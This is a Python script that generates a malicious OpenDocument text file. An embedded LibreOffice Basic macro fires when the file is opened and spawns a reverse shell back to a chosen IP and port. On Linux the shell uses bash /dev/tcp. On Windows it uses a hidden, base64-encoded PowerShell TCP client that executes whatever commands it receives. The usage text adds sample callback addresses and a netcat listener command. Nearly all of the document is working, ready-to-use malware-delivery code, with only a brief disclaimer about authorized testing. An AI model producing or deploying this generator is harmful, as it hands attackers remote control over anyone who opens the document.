#!/usr/bin/env python3
"""
ODT Reverse Shell Generator
Generates a malicious ODT file with an embedded LibreOffice Basic macro
that executes a reverse shell on document open.

For authorized red team / penetration testing engagements only.
"""

import argparse
import base64
import html
import sys
import zipfile


def build_linux_macro(ip, port):
    return (
        "Sub Main\n"
        f'    Shell "/bin/bash", 0, "-c \'bash -i >& /dev/tcp/{ip}/{port} 0>&1\'"\n'
        "End Sub"
    )


def build_windows_macro(ip, port):
    ps = (
        f"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        "$s=$c.GetStream();"
        "[byte[]]$b=0..65535|%{0};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0)"
        "{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);"
        "$r2=$r+'PS '+(pwd).Path+'> ';"
        "$sb=([Text.Encoding]::ASCII).GetBytes($r2);"
        "$s.Write($sb,0,$sb.Length);"
        "$s.Flush()};"
        "$c.Close()"
    )
    encoded = base64.b64encode(ps.encode("utf-16-le")).decode()
    return (
        "Sub Main\n"
        f'    Shell "cmd.exe", 0, "/c powershell -nop -w hidden -e {encoded}"\n'
        "End Sub"
    )


MIMETYPE = "application/vnd.oasis.opendocument.text"

CONTENT_XML = """\
<?xml version="1.0" encoding="UTF-8"?>
<office:document-content
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
  xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  office:version="1.2">
  <office:scripts>
    <office:event-listeners>
      <script:event-listener
        script:language="ooo:script"
        script:event-name="dom:load"
        xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document"
        xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts>
  <office:body>
    <office:text>
      <text:p/>
    </office:text>
  </office:body>
</office:document-content>"""

STYLES_XML = """\
<?xml version="1.0" encoding="UTF-8"?>
<office:document-styles
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  office:version="1.2">
</office:document-styles>"""

META_XML = """\
<?xml version="1.0" encoding="UTF-8"?>
<office:document-meta
  xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
  xmlns:meta="urn:oasis:names:tc:opendocument:xmlns:meta:1.0"
  office:version="1.2">
  <office:meta>
    <meta:generator>LibreOffice</meta:generator>
  </office:meta>
</office:document-meta>"""

SCRIPT_LB = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
<library:library
  xmlns:library="http://openoffice.org/2000/library"
  library:name="Standard"
  library:readonly="false"
  library:passwordprotected="false">
  <library:element library:name="Module1"/>
</library:library>"""

SCRIPT_LC = """\
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
<library:libraries
  xmlns:library="http://openoffice.org/2000/library"
  xmlns:xlink="http://www.w3.org/1999/xlink">
  <library:library
    library:name="Standard"
    xlink:href="Basic/Standard/script-lb.xml"
    xlink:type="simple"
    library:link="false"/>
</library:libraries>"""

MANIFEST_XML = """\
<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest
  xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"
  manifest:version="1.2">
  <manifest:file-entry manifest:full-path="/"
    manifest:version="1.2"
    manifest:media-type="application/vnd.oasis.opendocument.text"/>
  <manifest:file-entry manifest:full-path="content.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="styles.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="meta.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/" manifest:media-type=""/>
  <manifest:file-entry manifest:full-path="Basic/Standard/" manifest:media-type=""/>
  <manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/Standard/script-lb.xml" manifest:media-type="text/xml"/>
  <manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
</manifest:manifest>"""


def build_module_xml(macro_code):
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE script:module PUBLIC '
        '"-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">\n'
        '<script:module xmlns:script="http://openoffice.org/2000/script"\n'
        '  script:name="Module1"\n'
        f'  script:language="StarBasic">{html.escape(macro_code)}</script:module>'
    )


def generate_odt(ip, port, target_os, output):
    macro = build_linux_macro(ip, port) if target_os == "linux" else build_windows_macro(ip, port)

    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("mimetype", MIMETYPE, compress_type=zipfile.ZIP_STORED)
        zf.writestr("content.xml", CONTENT_XML)
        zf.writestr("styles.xml", STYLES_XML)
        zf.writestr("meta.xml", META_XML)
        zf.writestr("Basic/Standard/Module1.xml", build_module_xml(macro))
        zf.writestr("Basic/Standard/script-lb.xml", SCRIPT_LB)
        zf.writestr("Basic/script-lc.xml", SCRIPT_LC)
        zf.writestr("META-INF/manifest.xml", MANIFEST_XML)

    print(f"[+] Generated ODT with {target_os} reverse shell macro")
    print(f"[+] Callback: {ip}:{port}")
    print(f"[+] Output:   {output}")
    print(f"[+] Macro triggers on document open (requires macros enabled in LibreOffice)")


def main():
    parser = argparse.ArgumentParser(
        description="ODT Reverse Shell Generator — Red Team Tool",
        epilog=(
            "Examples:\n"
            "  %(prog)s 10.10.14.5 4444\n"
            "  %(prog)s 10.10.14.5 4444 --os windows -o shell.odt\n"
            "\n"
            "Start a listener:  nc -lvnp 4444"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("ip", help="Listener IP address for the reverse shell callback")
    parser.add_argument("port", type=int, help="Listener port number")
    parser.add_argument(
        "--os",
        choices=["linux", "windows"],
        default="linux",
        dest="target_os",
        help="Target OS for the reverse shell payload (default: linux)",
    )
    parser.add_argument(
        "-o", "--output",
        default="revshell.odt",
        help="Output ODT filename (default: revshell.odt)",
    )

    args = parser.parse_args()

    if not 1 <= args.port <= 65535:
        parser.error("port must be between 1 and 65535")

    generate_odt(args.ip, args.port, args.target_os, args.output)


if __name__ == "__main__":
    main()
